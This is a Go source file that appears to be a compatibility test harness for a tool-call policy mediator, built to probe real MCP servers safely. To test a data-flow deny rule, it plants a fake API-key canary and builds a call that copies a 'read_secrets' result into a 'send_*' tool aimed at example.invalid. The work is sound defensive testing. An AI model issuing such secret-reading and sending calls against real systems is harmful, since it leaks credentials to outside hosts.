// liveconv.go — the catalog-driven conversation for the real-world tier
// (docs/ROADMAP.md v0.4 compat lab). The hermetic tier drives a fixed
// conversation aimed at fakecmd's fixture tools; against a REAL server
// that conversation is wrong (unknown tools) and unsafe (it would execute
// write_file for real). The adaptive builder instead discovers the real
// catalog and generates only calls that are safe by construction:
//
//   - read-ish probes with benign args (read-only side effects),
//   - rule-deny probes for delete_file-shaped tools — denied BEFORE the
//     upstream is forwarded to, so nothing is actually deleted,
//   - the value-taint flow when both ends exist: a source call, then a
//     sink call carrying a value copied verbatim from the source's
//     RECORDED result — the flow deny fires pre-forward by construction,
//     and what-if parity holds because the same value is what
//     re-evaluation matches on (see planTaintSink).
//
// The conversation runs as two passes over one stack (same mediator, same
// taint state, one session log): Pass A discovers + probes + calls the
// taint source; Pass B issues the taint sink once a contaminating value
// is known. RunCell wires this when Cell.Adaptive is set.
package compat

import (
	"encoding/json"
	"fmt"
	"regexp"
	"sort"
	"strings"

	"github.com/Caseymccallum/tapelog/internal/replay"
)

// LiveRedactionCanary is the secret-shaped argument value the redaction
// probe plants. Unlike the hermetic canary it matches the built-in
// `sk-...` secret PATTERN as well as sensitive field names, so it is
// masked even if a real server echoes its arguments back in a result.
const LiveRedactionCanary = "sk-liveSECRETVALUE123456789012345678"

// ToolInfo is one advertised tool as seen through the mux (namespaced
// <server>__<tool>), plus the schema needed to build benign arguments.
type ToolInfo struct {
	Name   string
	Schema json.RawMessage
}

// LivePlan records what an adaptive conversation attempted, so the live
// test's assertions can be conditional on the server's real catalog
// (tool-specific denies "asserted only when the catalog contains them").
type LivePlan struct {
	Catalog     []string // tool names advertised (namespaced)
	Probes      []string // human-readable intents, in order
	Redaction   bool     // a redaction probe was sent
	WantDenies  []string // deny rule ids expected to have fired
	TaintSource string   // source tool called for the value-taint flow ("" = none)
	TaintSink   string   // sink tool called with the contaminated value ("" = none)
}

// ParseCatalog extracts tool names and input schemas from a tools/list
// result payload ({"tools": [...]}).
func ParseCatalog(result json.RawMessage) []ToolInfo {
	var r struct {
		Tools []json.RawMessage `json:"tools"`
	}
	if err := json.Unmarshal(result, &r); err != nil {
		return nil
	}
	var out []ToolInfo
	for _, t := range r.Tools {
		var d struct {
			Name        string          `json:"name"`
			InputSchema json.RawMessage `json:"inputSchema"`
		}
		if err := json.Unmarshal(t, &d); err != nil || d.Name == "" {
			continue
		}
		out = append(out, ToolInfo{Name: d.Name, Schema: d.InputSchema})
	}
	return out
}

// readishRe matches tool names safe to execute for real (read-only side
// effects at worst). Anything else is only called when policy denies it
// before forwarding.
var readishRe = regexp.MustCompile(`(?i)(read|get|list|search|describe|info|stat|query|select|fetch|lookup|show|head|count|exists|validate|diff|ping|echo)`)

// mutateRe is the belt to readishRe's suspenders: any mutating-shape name
// is never executed for real, even if it also matches readishRe.
var mutateRe = regexp.MustCompile(`(?i)(write|create|update|delete|remove|push|insert|add|send|post|put|patch|exec|run|apply|move|edit|set|drop|truncate|grant|call|invoke|upload|publish|merge|fork|revert|rollback)`)

// isReadish reports whether a tool may be executed for real with benign
// arguments.
func isReadish(name string) bool {
	return readishRe.MatchString(name) && !mutateRe.MatchString(name)
}

// globMatch reports whether name matches a policy-style glob pattern
// where '*' matches any run of characters. Mirrors internal/policy's
// compileGlobs semantics for the loopPolicy patterns.
func globMatch(pattern, name string) bool {
	var b strings.Builder
	b.WriteString("^")
	for _, r := range pattern {
		switch r {
		case '*':
			b.WriteString(".*")
		case '?', '.', '+', '(', ')', '|', '^', '$', '[', ']', '{', '}', '\\':
			b.WriteString(regexp.QuoteMeta(string(r)))
		default:
			b.WriteRune(r)
		}
	}
	b.WriteString("$")
	re, err := regexp.Compile(b.String())
	if err != nil {
		return false
	}
	return re.MatchString(name)
}

// matchesDeleteRule reports whether the lab policy's no-delete rule
// (*__delete_file) covers this tool. Kept in sync with loopPolicy.
func matchesDeleteRule(namespaced string) bool {
	return globMatch("*__delete_file", namespaced)
}

// matchesSendRule reports whether the lab policy's flow sink pattern
// (*__send_*) covers this tool. Kept in sync with loopPolicy.
func matchesSendRule(namespaced string) bool {
	return globMatch("*__send_*", namespaced)
}

// planLive builds Pass A of the adaptive conversation: tools/list, the
// redaction probe, benign read probes, the rule-deny probe, and the
// taint-source call when the catalog has the loopPolicy flow's source.
// The returned plan records what later assertions may condition on.
func planLive(catalog []ToolInfo) (passA []string, plan LivePlan) {
	nextID := 100 // discovery (a separate pass) uses low ids
	req := func(method, params string) string {
		line := fmt.Sprintf(`{"jsonrpc":"2.0","id":%d,"method":%q,"params":%s}`, nextID, method, params)
		nextID++
		return line
	}
	call := func(tool string, args map[string]any) string {
		raw, _ := json.Marshal(args)
		p := fmt.Sprintf(`{"name":%q,"arguments":%s}`, tool, raw)
		return req("tools/call", p)
	}

	for _, t := range catalog {
		plan.Catalog = append(plan.Catalog, t.Name)
	}

	// (No tools/list here: RunCell's discovery pass already recorded one.)

	// Redaction probe: a read-ish tool with benign args plus a canary
	// under a sensitive field name. The call is recorded (and the canary
	// masked) regardless of whether the upstream accepts the extra arg.
	var redactionTool string
	for _, t := range catalog {
		if isReadish(t.Name) {
			redactionTool = t.Name
			break
		}
	}
	if redactionTool == "" {
		// No read-ish tool at all: still prove redaction against a
		// rule-deny probe (denied pre-forward — never executes).
		for _, t := range catalog {
			if matchesDeleteRule(t.Name) {
				redactionTool = t.Name
				break
			}
		}
	}
	if redactionTool != "" {
		args := benignArgs(findTool(catalog, redactionTool))
		args["api_key"] = LiveRedactionCanary
		passA = append(passA, call(redactionTool, args))
		plan.Redaction = true
		plan.Probes = append(plan.Probes, "redaction: "+redactionTool)
	}

	// Benign read probes (up to 2 more read-ish tools not already probed):
	// exercises real results through the pipeline.
	probed := map[string]bool{redactionTool: true}
	benign := 0
	for _, t := range catalog {
		if benign >= 2 {
			break
		}
		if probed[t.Name] || !isReadish(t.Name) {
			continue
		}
		passA = append(passA, call(t.Name, benignArgs(t)))
		plan.Probes = append(plan.Probes, "benign: "+t.Name)
		probed[t.Name] = true
		benign++
	}

	// Rule-deny probe: only tools the lab policy actually denies
	// (loopPolicy no-delete matches *__delete_file). Denied in Decide()
	// before forwarding — the delete never reaches the upstream.
	for _, t := range catalog {
		if !matchesDeleteRule(t.Name) {
			continue
		}
		passA = append(passA, call(t.Name, map[string]any{"path": "tapelog-compat-probe.txt"}))
		plan.WantDenies = append(plan.WantDenies, "no-delete")
		plan.Probes = append(plan.Probes, "rule-deny: "+t.Name)
	}

	// Taint source (Pass A): only when the loopPolicy flow's source tool
	// exists. The sink follows in Pass B once a value is known.
	for _, t := range catalog {
		if !globMatch("*__read_secrets", t.Name) {
			continue
		}
		passA = append(passA, call(t.Name, benignArgs(t)))
		plan.TaintSource = t.Name
		plan.Probes = append(plan.Probes, "taint-source: "+t.Name)
		break
	}
	return passA, plan
}

// planTaintSink builds Pass B: the sink call carrying values copied
// verbatim from the source's RECORDED (post-redaction) result strings.
// Using recorded values is what guarantees what-if parity: re-evaluation
// re-derives taint from recorded results, so both the live check and the
// re-check see the identical value in the sink's arguments. Values that
// redaction turned into markers (or that are too short to taint) are
// skipped; when no usable value survives, no sink is sent and no deny is
// expected (the live assertions consult the plan).
func planTaintSink(catalog []ToolInfo, recorded string) (lines []string, sink string) {
	value := pickTaintValue(recorded)
	if value == "" {
		return nil, ""
	}
	for _, t := range catalog {
		if !matchesSendRule(t.Name) {
			continue
		}
		args := map[string]any{"url": "https://example.invalid/tapelog-compat", "body": value}
		raw, _ := json.Marshal(args)
		lines = append(lines,
			fmt.Sprintf(`{"jsonrpc":"2.0","id":9001,"method":"tools/call","params":{"name":%q,"arguments":%s}}`, t.Name, raw))
		return lines, t.Name
	}
	return nil, ""
}

// pickTaintValue chooses a string from a recorded tool result that is
// long enough to taint (>= 4 chars, matching internal/taint's minimum)
// and not a redaction marker. Longest first: the most distinctive value
// is the least collision-prone needle.
func pickTaintValue(recordedResult string) string {
	var vals []string
	collectStrings(json.RawMessage(recordedResult), &vals, 8192)
	sort.Slice(vals, func(i, j int) bool { return len(vals[i]) > len(vals[j]) })
	for _, v := range vals {
		if len(v) >= 4 && !strings.Contains(v, "[REDACTED]") {
			return v
		}
	}
	return ""
}

// collectStrings gathers every JSON string value in raw (recursive),
// bounded in length — the same walk internal/taint uses to mark values.
func collectStrings(raw json.RawMessage, out *[]string, maxLen int) {
	dec := json.NewDecoder(strings.NewReader(string(raw)))
	dec.UseNumber()
	var v any
	if err := dec.Decode(&v); err != nil {
		return
	}
	walkStrings(v, out, maxLen)
}

func walkStrings(v any, out *[]string, maxLen int) {
	switch t := v.(type) {
	case map[string]any:
		for _, k := range t {
			walkStrings(k, out, maxLen)
		}
	case []any:
		for _, e := range t {
			walkStrings(e, out, maxLen)
		}
	case string:
		if len(t) <= maxLen {
			*out = append(*out, t)
		}
	}
}

// benignArgs synthesizes minimal, harmless arguments from a tool's
// inputSchema: required properties only, values chosen by name/type
// heuristics that stay read-only (SELECT 1, https://example.com, ...).
func benignArgs(t ToolInfo) map[string]any {
	args := map[string]any{}
	if len(t.Schema) == 0 {
		return args
	}
	var s struct {
		Properties map[string]json.RawMessage `json:"properties"`
		Required   []string                   `json:"required"`
	}
	if err := json.Unmarshal(t.Schema, &s); err != nil {
		return args
	}
	for _, name := range s.Required {
		args[name] = benignValue(name, s.Properties[name])
	}
	return args
}

// benignValue picks a harmless value for one schema property.
func benignValue(name string, schema json.RawMessage) any {
	var p struct {
		Type  string            `json:"type"`
		Enum  []json.RawMessage `json:"enum"`
		Items json.RawMessage   `json:"items"`
	}
	_ = json.Unmarshal(schema, &p)
	if len(p.Enum) > 0 {
		var v any
		_ = json.Unmarshal(p.Enum[0], &v)
		return v
	}
	lower := strings.ToLower(name)
	switch {
	case strings.Contains(lower, "url") || strings.Contains(lower, "uri"):
		return "https://example.com"
	case strings.Contains(lower, "query") || strings.Contains(lower, "sql"):
		return "SELECT 1"
	case strings.Contains(lower, "path") || strings.Contains(lower, "file") || strings.Contains(lower, "dir"):
		return "tapelog-compat-probe.txt"
	case strings.Contains(lower, "prompt") || strings.Contains(lower, "text") ||
		strings.Contains(lower, "message") || strings.Contains(lower, "content") ||
		strings.Contains(lower, "body") || strings.Contains(lower, "description"):
		return "tapelog compat probe"
	}
	switch p.Type {
	case "integer", "number":
		return 1
	case "boolean":
		return true
	case "array":
		return []any{}
	case "object":
		return map[string]any{}
	default:
		return "tapelog-compat-probe"
	}
}

// sourceResult extracts the recorded result payload for the taint-source
// call from a loaded tape (matched by tool name). Returns "" when absent.
func sourceResult(tape *replay.Tape, tool string) string {
	for _, it := range tape.Interactions {
		if it.Tool == tool && !it.IsError && len(it.Result) > 0 {
			return string(it.Result)
		}
	}
	return ""
}

// CatalogFromHarnessOutput scans a harness transcript for the response
// to a tools/list request and returns the advertised catalog. (Harness
// lines are JSON-RPC responses; the one carrying "tools" is the listing.)
func CatalogFromHarnessOutput(out string) []ToolInfo {
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if !strings.Contains(line, `"tools"`) {
			continue
		}
		var msg struct {
			Result json.RawMessage `json:"result"`
		}
		if err := json.Unmarshal([]byte(line), &msg); err != nil || len(msg.Result) == 0 {
			continue
		}
		if cat := ParseCatalog(msg.Result); len(cat) > 0 {
			return cat
		}
	}
	return nil
}

// findTool returns the catalog entry for a tool name (zero value if
// absent).
func findTool(catalog []ToolInfo, name string) ToolInfo {
	for _, t := range catalog {
		if t.Name == name {
			return t
		}
	}
	return ToolInfo{}
}
